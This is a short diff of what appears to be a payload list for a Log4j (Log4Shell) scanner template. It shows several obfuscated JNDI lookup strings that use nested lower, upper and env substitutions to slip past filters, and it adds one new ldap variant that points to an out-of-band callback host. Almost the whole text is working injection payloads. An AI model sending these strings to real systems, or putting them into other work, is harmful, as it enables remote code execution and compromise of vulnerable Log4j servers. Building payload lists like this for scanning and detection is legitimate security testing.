@@ -9,4 +9,5 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh
 ${${aaa:bbb:-j}ndi:rmi://{{interactsh-url}}/poc}
 ${${:::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
 ${${:p:q::zz::::::::-j}ndi:rmi://{{interactsh-url}}/poc}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{interactsh-url}}/poc}
 ```
